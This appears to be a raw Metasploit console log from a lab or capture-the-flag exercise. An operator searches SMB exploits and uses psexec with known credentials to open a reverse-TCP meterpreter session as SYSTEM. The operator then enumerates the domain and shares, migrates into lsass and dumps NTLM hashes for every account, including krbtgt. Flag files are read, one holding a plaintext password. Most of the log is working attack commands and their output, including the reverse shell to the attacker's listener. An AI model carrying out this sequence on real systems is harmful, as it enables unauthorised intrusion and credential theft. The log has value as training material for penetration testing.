```
Interact with a module by name or index. For example info 126, use 126 or use auxiliary/fileformat/multidrop

msf6 > search smb -type exploit

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   exploit/multi/http/struts_code_exec_classloader             2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   1   exploit/osx/browser/safari_file_policy                      2011-10-12       normal     No     Apple Safari file:// Arbitrary Code Execution
   2   auxiliary/server/capture/smb                                                 normal     No     Authentication Capture: SMB
   3   auxiliary/scanner/http/citrix_dir_traversal                 2019-12-17       normal     No     Citrix ADC (NetScaler) Directory Traversal Scanner
   4   exploit/windows/scada/ge_proficy_cimplicity_gefebt          2014-01-23       excellent  Yes    GE Proficy CIMPLICITY gefebt.exe Remote Code Execution
   5   exploit/windows/smb/generic_smb_dll_injection               2015-03-04       manual     No     Generic DLL Injection From Shared Resource
   6   exploit/windows/http/generic_http_dll_injection             2015-03-04       manual     No     Generic Web Application DLL Injection
   7   exploit/windows/smb/group_policy_startup                    2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
   8   exploit/windows/misc/hp_dataprotector_install_service       2011-11-02       excellent  Yes    HP Data Protector 6.10/6.11/6.20 Install Service
   9   exploit/windows/misc/hp_dataprotector_cmd_exec              2014-11-02       excellent  Yes    HP Data Protector 8.10 Remote Command Execution
   10  exploit/windows/smb/ipass_pipe_exec                         2015-01-21       excellent  Yes    IPass Control Pipe Remote Command Execution
   11  exploit/windows/smb/ms03_049_netapi                         2003-11-11       good       No     MS03-049 Microsoft Workstation Service NetAddAlternateComputerName Overflow
   12  exploit/windows/smb/ms04_007_killbill                       2004-02-10       low        No     MS04-007 Microsoft ASN.1 Library Bitstring Heap Overflow
   13  exploit/windows/smb/ms04_011_lsass                          2004-04-13       good       No     MS04-011 Microsoft LSASS Service DsRolerUpgradeDownlevelServer Overflow
   14  exploit/windows/smb/ms04_031_netdde                         2004-10-12       good       No     MS04-031 Microsoft NetDDE Service Overflow
   15  exploit/windows/smb/ms05_039_pnp                            2005-08-09       good       Yes    MS05-039 Microsoft Plug and Play Service Overflow
   16  exploit/windows/smb/ms06_025_rras                           2006-06-13       average    No     MS06-025 Microsoft RRAS Service Overflow
   17  exploit/windows/smb/ms06_025_rasmans_reg                    2006-06-13       good       No     MS06-025 Microsoft RRAS Service RASMAN Registry Overflow
   18  exploit/windows/smb/ms06_040_netapi                         2006-08-08       good       No     MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow
   19  exploit/windows/smb/ms06_066_nwapi                          2006-11-14       good       No     MS06-066 Microsoft Services nwapi32.dll Module Exploit
   20  exploit/windows/smb/ms06_066_nwwks                          2006-11-14       good       No     MS06-066 Microsoft Services nwwks.dll Module Exploit
   21  exploit/windows/smb/ms06_070_wkssvc                         2006-11-14       manual     No     MS06-070 Microsoft Workstation Service NetpManageIPCConnect Overflow
   22  exploit/windows/smb/ms07_029_msdns_zonename                 2007-04-12       manual     No     MS07-029 Microsoft DNS RPC Service extractQuotedChar() Overflow (SMB)
   23  exploit/windows/smb/ms08_067_netapi                         2008-10-28       great      Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
   24  exploit/windows/smb/smb_relay                               2001-03-31       excellent  No     MS08-068 Microsoft Windows SMB Relay Code Execution
   25  exploit/windows/smb/ms09_050_smb2_negotiate_func_index      2009-09-07       good       No     MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   26  exploit/windows/browser/ms10_022_ie_vbscript_winhlp32       2010-02-26       great      No     MS10-022 Microsoft Internet Explorer Winhlp32.exe MsgBox Code Execution
   27  exploit/windows/smb/ms10_061_spoolss                        2010-09-14       excellent  No     MS10-061 Microsoft Print Spooler Service Impersonation Vulnerability
   28  exploit/windows/fileformat/ms13_071_theme                   2013-09-10       excellent  No     MS13-071 Microsoft Windows Theme File Handling Arbitrary Code Execution
   29  exploit/windows/fileformat/ms14_060_sandworm                2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
   30  exploit/windows/smb/ms17_010_eternalblue                    2017-03-14       average    Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   31  exploit/windows/smb/ms17_010_psexec                         2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   32  auxiliary/admin/smb/ms17_010_command                        2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   33  auxiliary/dos/windows/smb/ms05_047_pnp                                       normal     No     Microsoft Plug and Play Service Registry Overflow
   34  auxiliary/dos/windows/smb/ms06_063_trans                                     normal     No     Microsoft SRV.SYS Pipe Transaction No Null
   35  auxiliary/dos/windows/smb/ms09_001_write                                     normal     No     Microsoft SRV.SYS WriteAndX Invalid DataOffset
   36  auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                    normal     No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   37  auxiliary/dos/windows/smb/vista_negotiate_stop                               normal     No     Microsoft Vista SP0 SMB Negotiate Protocol DoS
   38  auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                   normal     No     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop
   39  exploit/windows/smb/psexec                                  1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
   40  auxiliary/dos/windows/smb/ms11_019_electbowser                               normal     No     Microsoft Windows Browser Pool DoS
   41  exploit/windows/smb/smb_rras_erraticgopher                  2017-06-13       average    Yes    Microsoft Windows RRAS Service MIBEntryGet Overflow
   42  exploit/windows/smb/smb_shadow                              2021-02-16       manual     No     Microsoft Windows SMB Direct Session Takeover
   43  auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                     normal     No     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS
   44  exploit/windows/smb/ms10_046_shortcut_icon_dllloader        2010-07-16       excellent  No     Microsoft Windows Shell LNK Code Execution
   45  exploit/windows/smb/ms15_020_shortcut_icon_dllloader        2015-03-10       excellent  No     Microsoft Windows Shell LNK Code Execution
   46  exploit/windows/smb/netidentity_xtierrpcpipe                2009-04-06       great      No     Novell NetIdentity Agent XTIERRPCPIPE Named Pipe Buffer Overflow
   47  exploit/netware/smb/lsass_cifs                              2007-01-21       average    No     Novell NetWare LSASS CIFS.NLM Driver Stack Buffer Overflow
   48  exploit/windows/oracle/extjob                               2007-01-01       excellent  Yes    Oracle Job Scheduler Named Pipe Command Execution
   49  auxiliary/scanner/sap/sap_smb_relay                                          normal     No     SAP SMB Relay Abuse
   50  auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir                              normal     No     SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing
   51  exploit/windows/smb/smb_doublepulsar_rce                    2017-04-14       great      Yes    SMB DOUBLEPULSAR Remote Code Execution
   52  exploit/windows/smb/smb_delivery                            2016-07-26       excellent  No     SMB Delivery
   53  auxiliary/scanner/smb/smb_enum_gpp                                           normal     No     SMB Group Policy Preference Saved Passwords Enumeration
   54  exploit/windows/local/cve_2020_0796_smbghost                2020-03-13       good       Yes    SMBv3 Compression Buffer Overflow
   55  exploit/windows/smb/cve_2020_0796_smbghost                  2020-03-13       average    Yes    SMBv3 Compression Buffer Overflow
   56  auxiliary/admin/smb/samba_symlink_traversal                                  normal     No     Samba Symlink Directory Traversal
   57  exploit/linux/samba/chain_reply                             2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
   58  exploit/multi/ids/snort_dce_rpc                             2007-02-19       good       No     Snort 2 DCE/RPC Preprocessor Buffer Overflow
   59  exploit/windows/browser/java_ws_double_quote                2012-10-16       excellent  No     Sun Java Web Start Double Quote Injection
   60  exploit/windows/browser/java_ws_arginject_altjvm            2010-04-09       excellent  No     Sun Java Web Start Plugin Command Line Argument Injection
   61  exploit/windows/browser/java_ws_vmargs                      2012-02-14       excellent  No     Sun Java Web Start Plugin Command Line Argument Injection
   62  auxiliary/server/teamviewer_uri_smb_redirect                                 normal     No     TeamViewer Unquoted URI Handler SMB Redirect
   63  exploit/windows/smb/timbuktu_plughntcommand_bof             2009-06-25       great      No     Timbuktu PlughNTCommand Named Pipe Buffer Overflow
   64  exploit/windows/fileformat/ursoft_w32dasm                   2005-01-24       good       No     URSoft W32Dasm Disassembler Function Buffer Overflow
   65  exploit/windows/fileformat/vlc_smb_uri                      2009-06-24       great      No     VideoLAN Client (VLC) Win32 smb:// URI Buffer Overflow
   66  auxiliary/admin/smb/webexec_command                                          normal     No     WebEx Remote Command Execution Utility
   67  exploit/windows/smb/webexec                                 2018-10-24       manual     No     WebExec Authenticated User Code Execution
   68  post/windows/gather/credentials/gpp                                          normal     No     Windows Gather Group Policy Preference Saved Passwords
   69  payload/windows/peinject/reverse_named_pipe                                  normal     No     Windows Inject PE Files, Windows x86 Reverse Named Pipe (SMB) Stager
   70  payload/windows/x64/peinject/reverse_named_pipe                              normal     No     Windows Inject Reflective PE Files, Windows x64 Reverse Named Pipe (SMB) Stager
   71  post/windows/gather/netlm_downgrade                                          normal     No     Windows NetLM Downgrade Attack


Interact with a module by name or index. For example info 71, use 71 or use post/windows/gather/netlm_downgrade

msf6 > use 39
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > show options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBUser                                no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.18.112.115    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/smb/psexec) > setg RHOSTS 10.10.26.55
RHOSTS => 10.10.26.55
msf6 exploit(windows/smb/psexec) > set SMBUser ballen
SMBUser => ballen
msf6 exploit(windows/smb/psexec) > set SMBPass Password1
SMBPass => Password1
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.18.112.115:4444 
[*] 10.10.26.55:445 - Connecting to the server...
[*] 10.10.26.55:445 - Authenticating to 10.10.26.55:445 as user 'ballen'...
[*] 10.10.26.55:445 - Selecting PowerShell target
[*] 10.10.26.55:445 - Executing the payload...
[+] 10.10.26.55:445 - Service start timed out, OK if running a command or non-service executable...
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/psexec) > 
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.18.112.115:4444 
[*] 10.10.26.55:445 - Connecting to the server...
[*] 10.10.26.55:445 - Authenticating to 10.10.26.55:445 as user 'ballen'...
[*] 10.10.26.55:445 - Selecting PowerShell target
[*] 10.10.26.55:445 - Executing the payload...
[+] 10.10.26.55:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.10.26.55
[*] Meterpreter session 1 opened (10.18.112.115:4444 -> 10.10.26.55:60637 ) at 2022-06-05 11:39:11 +0530

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > getpid
Current pid: 3924
meterpreter > hostname
[-] Unknown command: hostname
meterpreter > getsystem
[-] Already running as SYSTEM
meterpreter > sysinfo
Computer        : ACME-TEST
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : FLASH
Logged On Users : 7
Meterpreter     : x86/windows
meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(windows/smb/psexec) > sessions

Active sessions
===============

  Id  Name  Type                     Information                      Connection
  --  ----  ----                     -----------                      ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ ACME-TEST  10.18.112.115:4444 -> 10.10.26.55:60637  (10.10.26.55)

msf6 exploit(windows/smb/psexec) > session -i 1
[-] Unknown command: session
msf6 exploit(windows/smb/psexec) > sessions 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : ACME-TEST
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : FLASH
Logged On Users : 7
Meterpreter     : x86/windows
meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(windows/smb/psexec) > use post/windows/gather/enum_domain
msf6 post(windows/gather/enum_domain) > option
[-] Unknown command: option
msf6 post(windows/gather/enum_domain) > show options

Module options (post/windows/gather/enum_domain):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on

msf6 post(windows/gather/enum_domain) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/enum_domain) > show options

Module options (post/windows/gather/enum_domain):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on

msf6 post(windows/gather/enum_domain) > run

[+] FOUND Domain: FLASH
[+] FOUND Domain Controller: ACME-TEST (IP: 10.10.26.55)
[*] Post module execution completed
msf6 post(windows/gather/enum_domain) > use post/windows/gather/enum_shares
msf6 post(windows/gather/enum_shares) > show options

Module options (post/windows/gather/enum_shares):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CURRENT  true             yes       Enumerate currently configured shares
   ENTERED  true             yes       Enumerate Recently entered UNC Paths in the Run Dialog
   RECENT   true             yes       Enumerate Recently mapped shares
   SESSION                   yes       The session to run this module on

msf6 post(windows/gather/enum_shares) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/enum_shares) > run

[*] Running against session 1
[*] The following shares were found:
[*]     Name: SYSVOL
[*] 
[*]     Name: NETLOGON
[*] 
[*]     Name: speedster
[*] 
[*] Post module execution completed
msf6 post(windows/gather/enum_shares) > sessions

Active sessions
===============

  Id  Name  Type                     Information                      Connection
  --  ----  ----                     -----------                      ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ ACME-TEST  10.18.112.115:4444 -> 10.10.26.55:60637  (10.10.26.55)

msf6 post(windows/gather/enum_shares) > sessions 1
[*] Starting interaction with 1...

meterpreter > ps

Process List
============

 PID   PPID  Name                                 Arch  Session  User                          Path
 ---   ----  ----                                 ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                               x64   0
 68    4     Registry                             x64   0
 400   4     smss.exe                             x64   0
 552   544   csrss.exe                            x64   0
 624   616   csrss.exe                            x64   1
 640   544   wininit.exe                          x64   0
 692   616   winlogon.exe                         x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 760   640   services.exe                         x64   0
 776   640   lsass.exe                            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 888   760   svchost.exe                          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 904   760   svchost.exe                          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 928   1400  conhost.exe                          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 956   760   svchost.exe                          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1000  760   svchost.exe                          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1028  692   dwm.exe                              x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
 1056  760   svchost.exe                          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1140  760   svchost.exe                          x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1148  760   svchost.exe                          x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1156  760   svchost.exe                          x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1216  760   svchost.exe                          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1400  888   CompatTelRunner.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\CompatTelRunner.exe
 1408  760   svchost.exe                          x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1416  760   TrustedInstaller.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
 1456  760   svchost.exe                          x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1548  760   svchost.exe                          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1712  760   svchost.exe                          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1812  888   taskhostw.exe                        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\taskhostw.exe
 2236  692   fontdrvhost.exe                      x64   1        Font Driver Host\UMFD-1       C:\Windows\System32\fontdrvhost.exe
 2260  640   fontdrvhost.exe                      x64   0        Font Driver Host\UMFD-0       C:\Windows\System32\fontdrvhost.exe
 2268  2496  conhost.exe                          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 2276  760   spoolsv.exe                          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 2340  760   svchost.exe                          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2360  760   svchost.exe                          x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2424  760   svchost.exe                          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2452  760   amazon-ssm-agent.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 2472  760   LiteAgent.exe                        x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 2488  760   ismserv.exe                          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\ismserv.exe
 2496  888   CompatTelRunner.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\CompatTelRunner.exe
 2504  760   Microsoft.ActiveDirectory.WebServic  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe
             es.exe
 2512  760   dfsrs.exe                            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dfsrs.exe
 2532  760   dfssvc.exe                           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dfssvc.exe
 2604  760   dns.exe                              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dns.exe
 2968  760   vds.exe                              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
 2980  2452  ssm-agent-worker.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\ssm-agent-worker.exe
 2988  2980  conhost.exe                          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 3172  692   LogonUI.exe                          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 3588  3924  conhost.exe                          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 3612  956   TiWorker.exe                         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.1812_none_56b727f39
                                                                                               9423259\TiWorker.exe
 3708  760   msdtc.exe                            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
 3916  760   svchost.exe                          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 3924  2176  powershell.exe                       x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe

meterpreter > get pid
[-] Unknown command: get
meterpreter > getpid
Current pid: 3924
meterpreter > migrate 776
[*] Migrating from 3924 to 776...
[*] Migration completed successfully.
meterpreter > getpid
Current pid: 776
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9ac3de200cb4d510fed7610c7037292:::
ballen:1112:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
jfox:1115:aad3b435b51404eeaad3b435b51404ee:c64540b95e2b2f36f0291c3a9fb8b840:::
lnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9:::
erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::
ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:53666b822acca7130745cc6d7a0baee5:::
meterpreter > 
meterpreter > pwd
C:\Windows\system32
meterpreter > search -i secret.txt
[-] You must specify a valid file glob to search for, e.g. >search -f *.doc
meterpreter > search -f secret.txt

No files matching your search were found.
meterpreter > 
meterpreter > search -f secrets.txt
Found 1 result...
=================

Path                                                            Size (bytes)  Modified (UTC)
----                                                            ------------  --------------
c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  35            2021-07-30 13:14:27 +0530

meterpreter > search -f *secret*txt
Found 2 results...
==================

Path                                                            Size (bytes)  Modified (UTC)
----                                                            ------------  --------------
c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  35            2021-07-30 13:14:27 +0530
c:\inetpub\wwwroot\realsecret.txt                               34            2021-07-30 14:00:24 +0530

meterpreter > cat c:\inetpub\wwwroot\realsecret.txt
[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
meterpreter > cd c:\
 > Interrupt: use the 'exit' command to quit
meterpreter > pwd
C:\Windows\system32
meterpreter > cd ../..
meterpreter > pwd
C:\
meterpreter > cd inetpub\\wwwroot\\
meterpreter > cat realsecret.txt 
The Flash is the fastest man alivemeterpreter > pwd
C:\inetpub\wwwroot
meterpreter > cd ../..
meterpreter > cd Program
cd ProgramData\\            cd Program\ Files\ (x86)\\  cd Program\ Files\\         
meterpreter > cd Program
cd ProgramData\\            cd Program\ Files\ (x86)\\  cd Program\ Files\\         
meterpreter > cd Program*Files*86*
[-] stdapi_fs_chdir: Operation failed: The filename, directory name, or volume label syntax is incorrect.
meterpreter > cd Program\ Files\ (x86)\\
meterpreter > pwd
C:\Program Files (x86)
meterpreter > cd Windows\ Multimedia\ Platform\\
meterpreter > cat secrets.txt
My Twitter password is KDSvbsw3849!meterpreter > pwd
C:\Program Files (x86)\Windows Multimedia Platform
meterpreter > run post/windows/gather/hashdump

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 36c8d26ec0df8b23ce63bcefa6e2d821...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[-] Post failed: NoMethodError undefined method `unpack' for nil:NilClass
[-] Call stack:
[-]   /usr/share/metasploit-framework/modules/post/windows/gather/hashdump.rb:260:in `decrypt_user_hash'
[-]   /usr/share/metasploit-framework/modules/post/windows/gather/hashdump.rb:232:in `block in decrypt_user_keys'
[-]   /usr/share/metasploit-framework/modules/post/windows/gather/hashdump.rb:221:in `each_key'
[-]   /usr/share/metasploit-framework/modules/post/windows/gather/hashdump.rb:221:in `decrypt_user_keys'
[-]   /usr/share/metasploit-framework/modules/post/windows/gather/hashdump.rb:54:in `run'
meterpreter > sessions
Usage: sessions <id>

Interact with a different session Id.
This works the same as calling this from the MSF shell: sessions -i <session id>

meterpreter > session
[-] Unknown command: session
meterpreter > bg
[*] Backgrounding session 1...
msf6 post(windows/gather/enum_shares) > sessions

Active sessions
===============

  Id  Name  Type                     Information                      Connection
  --  ----  ----                     -----------                      ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ ACME-TEST  10.18.112.115:4444 -> 10.10.26.55:60637  (10.10.26.55)

msf6 post(windows/gather/enum_shares) > use post/windows/gather/hashdump
msf6 post(windows/gather/hashdump) > show options

Module options (post/windows/gather/hashdump):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on

msf6 post(windows/gather/hashdump) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/hashdump) > show options

Module options (post/windows/gather/hashdump):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on

msf6 post(windows/gather/hashdump) > run

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 36c8d26ec0df8b23ce63bcefa6e2d821...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[-] Post failed: NoMethodError undefined method `unpack' for nil:NilClass
[-] Call stack:
[-]   /usr/share/metasploit-framework/modules/post/windows/gather/hashdump.rb:260:in `decrypt_user_hash'
[-]   /usr/share/metasploit-framework/modules/post/windows/gather/hashdump.rb:232:in `block in decrypt_user_keys'
[-]   /usr/share/metasploit-framework/modules/post/windows/gather/hashdump.rb:221:in `each_key'
[-]   /usr/share/metasploit-framework/modules/post/windows/gather/hashdump.rb:221:in `decrypt_user_keys'
[-]   /usr/share/metasploit-framework/modules/post/windows/gather/hashdump.rb:54:in `run'
[*] Post module execution completed
msf6 post(windows/gather/hashdump) > fg
[-] Unknown command: fg
msf6 post(windows/gather/hashdump) > sessions 1
[*] Starting interaction with 1...

meterpreter > run post/windows/gather/enum_shares

[*] Running against session 1
[*] The following shares were found:
[*]     Name: SYSVOL
[*] 
[*]     Name: NETLOGON
[*] 
[*]     Name: speedster
```
